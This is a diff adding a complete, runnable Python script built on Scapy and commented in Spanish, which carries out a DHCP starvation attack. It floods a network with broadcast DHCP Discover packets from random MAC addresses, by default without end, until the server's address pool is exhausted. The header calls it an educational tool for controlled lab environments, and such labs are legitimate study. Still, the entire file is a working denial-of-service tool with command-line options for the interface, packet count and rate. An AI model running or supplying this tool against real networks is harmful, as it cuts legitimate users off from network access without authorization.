@@ -1,0 +1,102 @@
+#!/usr/bin/env python3
+"""
+=======================================================================
+  DHCP STARVATION ATTACK — Laboratorio de Seguridad en Redes
+  Herramienta: Scapy
+  Descripcion: Agota el pool de IPs del servidor DHCP enviando
+               multiples DHCP Discover con MACs aleatorias.
+  USO EDUCATIVO / ENTORNO CONTROLADO UNICAMENTE
+=======================================================================
+"""
+
+import os, sys, random, time, argparse
+from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+BANNER = f"""
+{Fore.RED}╔══════════════════════════════════════════════════╗
+║         DHCP STARVATION — Scapy Lab Tool         ║
+║      Solo para entornos de prueba controlados    ║
+╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
+"""
+
+def generar_mac_aleatoria() -> str:
+    """Genera una MAC con OUI 02: (bit administrado localmente)."""
+    octetos = [random.randint(0, 255) for _ in range(5)]
+    return "02:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(*octetos)
+
+def construir_discover(mac_src: str) -> Ether:
+    """Construye un paquete DHCP Discover con la MAC indicada."""
+    mac_bytes = bytes.fromhex(mac_src.replace(":", ""))
+    xid_random = random.randint(1, 0xFFFF_FFFF)
+
+    pkt = (
+        Ether(src=mac_src, dst="ff:ff:ff:ff:ff:ff")
+        / IP(src="0.0.0.0", dst="255.255.255.255")
+        / UDP(sport=68, dport=67)
+        / BOOTP(chaddr=mac_bytes, xid=xid_random, flags=0x8000)
+        / DHCP(options=[("message-type", "discover"), "end"])
+    )
+    return pkt
+
+def lanzar_ataque(interfaz: str, total: int, intervalo: float) -> None:
+    """Bucle principal del ataque de agotamiento DHCP."""
+    enviados = 0
+    inicio = time.time()
+    modo = "Infinito" if total == 0 else str(total)
+
+    print(BANNER)
+    print(f"{Fore.YELLOW}[*] Interfaz  : {interfaz}")
+    print(f"{Fore.YELLOW}[*] Paquetes  : {modo}")
+    print(f"{Fore.YELLOW}[*] Intervalo : {intervalo}s")
+    print(f"{Fore.CYAN}[*] Iniciando agotamiento DHCP... CTRL+C para detener\n")
+
+    try:
+        while True:
+            if total > 0 and enviados >= total:
+                break
+
+            mac = generar_mac_aleatoria()
+            paquete = construir_discover(mac)
+            sendp(paquete, iface=interfaz, verbose=False)
+            enviados += 1
+
+            elapsed = time.time() - inicio
+            tasa = enviados / elapsed if elapsed > 0 else 0.0
+
+            print(
+                f"{Fore.GREEN}[→] #{enviados:05d} | "
+                f"MAC: {mac} | "
+                f"Tasa: {tasa:.1f} pkt/s",
+                end="\r",
+            )
+            time.sleep(intervalo)
+
+    except KeyboardInterrupt:
+        print()
+
+    elapsed_total = time.time() - inicio
+    print(f"\n{Fore.CYAN}[✓] Paquetes enviados : {enviados}")
+    print(f"{Fore.CYAN}[✓] Tiempo total      : {elapsed_total:.1f}s")
+    print(f"{Fore.CYAN}[✓] Tasa promedio     : {enviados/elapsed_total:.1f} pkt/s" if elapsed_total > 0 else "")
+    print(f"{Fore.RED}\n[!] Ataque finalizado. Verifique el pool DHCP en el servidor.\n")
+
+def main():
+    if os.geteuid() != 0:
+        print(f"{Fore.RED}[!] Este script requiere privilegios root (sudo).")
+        sys.exit(1)
+
+    parser = argparse.ArgumentParser(
+        description="DHCP Starvation Attack — Herramienta educativa con Scapy"
+    )
+    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej. eth0)")
+    parser.add_argument("-c", "--count", type=int, default=0, help="Num. de paquetes (0=infinito)")
+    parser.add_argument("-d", "--delay", type=float, default=0.05, help="Intervalo entre paquetes (seg)")
+    args = parser.parse_args()
+
+    lanzar_ataque(args.interface, args.count, args.delay)
+
+if __name__ == "__main__":
+    main()
